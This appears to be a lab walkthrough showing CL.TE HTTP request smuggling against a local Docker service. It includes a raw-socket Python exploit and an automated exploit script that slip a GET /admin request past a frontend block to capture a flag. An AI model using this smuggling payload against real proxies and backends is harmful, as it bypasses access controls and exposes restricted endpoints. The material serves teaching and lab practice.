# Walkthrough: HTTP Browser Desync

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```json
{"status": "ok", "path": "/"}
```

## Step 1: Confirm Frontend Blocks Admin

```bash
curl -v http://localhost:8080/admin
```

Output:
```
< HTTP/1.1 403 Forbidden
{"error":"forbidden","note":"admin is not accessible from the public interface"}
```

The frontend enforces the block. The backend has no frontend-equivalent ACL.

## Step 2: Understand the Parsing Gap

The frontend reads `Content-Length` bytes of body and forwards the raw request to the backend. The backend parses `Transfer-Encoding: chunked`. When both headers appear, they disagree on the body boundary.

The CL.TE payload structure:

```
Content-Length: 43
Transfer-Encoding: chunked

[5 bytes]  0\r\n\r\n               <-- chunked terminator (backend stops here)
[38 bytes] GET /admin HTTP/1.1\r\n <-- smuggled request line
           Host: localhost\r\n     <-- smuggled host header
```

Frontend reads 43 bytes: all of the above. Backend's chunked parser reads 5 bytes and stops. The remaining 38 bytes are "leftovers" that the backend processes as a new HTTP request.

## Step 3: Send the Smuggling Request

```python
import socket, re

body = b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n"
# len(body) == 43

request = (
    "POST / HTTP/1.1\r\n"
    "Host: localhost:8080\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
).encode() + body

sock = socket.socket()
sock.connect(("localhost", 8080))
sock.settimeout(3)
sock.sendall(request)

resp = b""
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk: break
        resp += chunk
except socket.timeout:
    pass
sock.close()
print(resp.decode())
```

Output:
```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 60

{"status":"smuggled","flag":"POC{...}"}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080

[*] Step 1: confirming direct /admin access is blocked...
    HTTP/1.1 403 Forbidden
    [+] /admin blocked on frontend

[*] Step 2: building CL.TE smuggling payload...
    Content-Length: 43
    Body breakdown:
      [5B] chunked terminator: b'0\r\n\r\n'
      [38B] smuggled prefix:    b'GET /admin HTTP/1.1\r\nHost: localhost\r\n'

[*] Step 3: sending raw TCP request to frontend...
    Request headers include both Content-Length: 43 and Transfer-Encoding: chunked

[*] Response:
    HTTP/1.1 200 OK
    Content-Type: application/json
    Content-Length: 60

    {"status":"smuggled","flag":"POC{...}"}

[+] Flag: POC{...}
```
